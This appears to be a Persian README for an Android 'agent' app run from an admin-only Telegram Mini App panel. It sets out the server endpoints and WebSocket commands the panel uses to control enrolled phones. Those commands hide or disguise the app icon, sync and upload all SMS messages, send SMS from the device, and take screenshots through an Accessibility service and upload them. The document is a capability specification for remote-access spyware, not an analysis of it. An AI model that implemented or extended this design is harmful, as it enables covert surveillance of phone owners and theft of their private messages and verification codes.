# کلاینت Android و پنل Telegram

## نقش‌ها

| جزء | مسیر | کار |
| --- | --- | --- |
| Agent | `android/` | اتصال WebSocket به `server/`؛ `userId` + `deviceId` در `hello` |
| پنل | `../panel/` | Mini App؛ فقط ادمین؛ حضور از `/v1/overview` |
| سرور | `../server/` | hub realtime + Mongo outbox |

## فرمان‌های پنل (`panel.*`)

HTTP: `POST /v1/users/{userId}/devices/{deviceId}/command`  
بدنه: `{ "type": "ping" }` یا `{ "type": "icon", "mode": "normal"|"hidden"|"changed" }`

| type | WS به کلاینت | پاسخ |
| --- | --- | --- |
| `ping` | `panel.ping` | `panel.result` با `ref` = id فرمان؛ سرور `rttMs` برمی‌گرداند |
| `icon` | `panel.icon` + `mode` | `panel.result` با `iconState` |
| `sms.sync` | `panel.sms.sync` | `panel.result` + `count`؛ کلاینت `sms.batch` می‌فرستد |
| ارسال SMS | `panel.sms.send` | HTTP `POST .../sms/send` → `panel.result` |
| `screenshot` | `panel.screenshot` | Accessibility `takeScreenshot` (API ۳۰+)؛ آپلود JPEG؛ `panel.result` |

اسکرین‌شات: سرویس `AgentAccessibilityService`؛ آپلود `POST /v1/users/{userId}/devices/{deviceId}/screenshot`؛ دریافت پنل `GET` همان مسیر.

## پیامک

- دسترسی‌ها روی گوشی: `READ_SMS` / `RECEIVE_SMS` / `SEND_SMS` (درخواست در `MainActivity`)
- همگام‌سازی: `POST /v1/users/{userId}/devices/{deviceId}/sms/sync`
- فهرست گفتگو: `GET .../sms/threads`
- پیام‌های یک گفتگو: `GET .../sms/threads/{threadKey}`
- ارسال: `POST .../sms/send` با `{ "to", "body" }`
- آپلود کلاینت → سرور: نوع `sms.batch`
